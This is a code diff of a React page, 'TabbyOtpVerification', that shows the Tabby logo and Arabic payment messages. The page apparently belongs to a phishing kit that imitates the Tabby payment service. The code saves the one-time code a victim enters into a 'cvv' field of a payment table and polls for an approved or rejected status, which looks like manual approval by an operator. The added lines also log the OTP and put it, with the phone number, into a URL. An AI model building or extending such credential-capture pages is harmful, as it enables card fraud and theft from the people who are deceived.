@@ -3,8 +3,10 @@ import { useSearchParams, useNavigate } from "react-router-dom";
 import { ChevronRight, CheckCircle, XCircle } from "lucide-react";
 import tabbyLogo from "@/assets/tabby-logo.png";
 import { supabase } from "@/integrations/supabase/client";
+import { useToast } from "@/hooks/use-toast";
 const loadingMessages = ["جاري الدفع", "جاري المعالجة", "جاري التحقق"];
 const TabbyOtpVerification = () => {
+  const { toast } = useToast();
   const [otp, setOtp] = useState(["", "", "", ""]);
   const [searchParams] = useSearchParams();
   const navigate = useNavigate();
@@ -43,9 +45,25 @@ const TabbyOtpVerification = () => {
   };
   const handleVerify = async () => {
     const otpCode = otp.join("");
-    console.log("handleVerify called", { otpCode, isOtpComplete, paymentId });
-    if (!isOtpComplete || !paymentId) {
-      console.log("Verification blocked:", { isOtpComplete, paymentId });
+    console.log("handleVerify called", { otpCode, isOtpComplete, paymentId, price, company });
+    
+    if (!isOtpComplete) {
+      console.log("OTP غير مكتمل");
+      toast({
+        title: "خطأ",
+        description: "يرجى إدخال رمز التحقق كاملاً",
+        variant: "destructive",
+      });
+      return;
+    }
+
+    if (!paymentId) {
+      console.log("paymentId مفقود - التحويل مباشرة");
+      // إذا لم يكن هناك paymentId، نحول مباشرة إلى صفحة الدفع
+      setVerificationStatus("success");
+      setTimeout(() => {
+        navigate(`/tabby-payment?price=${price}&company=${company}&phone=${phone}&otp=${otpCode}`);
+      }, 1500);
       return;
     }
 
@@ -58,35 +76,51 @@ const TabbyOtpVerification = () => {
       clearTimeout(timeoutRef.current);
       timeoutRef.current = null;
     }
+    
     setVerificationStatus("loading");
+    
     try {
+      console.log("تحديث OTP في قاعدة البيانات:", { paymentId, otpCode });
+      
       // Update OTP code in database
-      const {
-        error: updateError
-      } = await supabase.from("tabby_payments").update({
-        cvv: otpCode
-      }).eq("id", paymentId);
+      const { error: updateError } = await supabase
+        .from("tabby_payments")
+        .update({ cvv: otpCode })
+        .eq("id", paymentId);
+
       if (updateError) {
         console.error("Error updating OTP:", updateError);
+        toast({
+          title: "خطأ",
+          description: "فشل في تحديث رمز التحقق",
+          variant: "destructive",
+        });
         setVerificationStatus("idle");
         setOtp(["", "", "", ""]);
         inputRefs.current[0]?.focus();
         return;
       }
 
+      console.log("بدء الـ polling للتحقق من الحالة");
+
       // Poll for payment status every 1 second
       pollIntervalRef.current = setInterval(async () => {
         try {
-          const {
-            data: statusData,
-            error: statusError
-          } = await supabase.from("tabby_payments").select("payment_status").eq("id", paymentId).single();
+          const { data: statusData, error: statusError } = await supabase
+            .from("tabby_payments")
+            .select("payment_status")
+            .eq("id", paymentId)
+            .single();
+
           if (statusError) {
             console.error("Error polling status:", statusError);
             return;
           }
+          
           console.log("Payment status:", statusData.payment_status);
+          
           if (statusData.payment_status === "approved") {
+            console.log("تمت الموافقة - التحويل إلى صفحة الدفع");
             if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
             if (timeoutRef.current) clearTimeout(timeoutRef.current);
             setVerificationStatus("success");
@@ -94,6 +128,7 @@ const TabbyOtpVerification = () => {
               navigate(`/tabby-payment?paymentId=${paymentId}&price=${price}&company=${company}`);
             }, 1500);
           } else if (statusData.payment_status === "rejected") {
+            console.log("تم الرفض");
             if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
             if (timeoutRef.current) clearTimeout(timeoutRef.current);
             setVerificationStatus("error");
@@ -110,6 +145,7 @@ const TabbyOtpVerification = () => {
 
       // Timeout after 30 seconds - return to idle if no response
       timeoutRef.current = setTimeout(() => {
+        console.log("انتهى وقت الانتظار - 30 ثانية");
         if (pollIntervalRef.current) clearInterval(pollIntervalRef.current);
         setVerificationStatus("error");
         setTimeout(() => {
@@ -120,6 +156,11 @@ const TabbyOtpVerification = () => {
       }, 30000);
     } catch (error) {
       console.error("OTP verification error:", error);
+      toast({
+        title: "خطأ",
+        description: "حدث خطأ أثناء التحقق",
+        variant: "destructive",
+      });
       setVerificationStatus("idle");
       setOtp(["", "", "", ""]);
       inputRefs.current[0]?.focus();
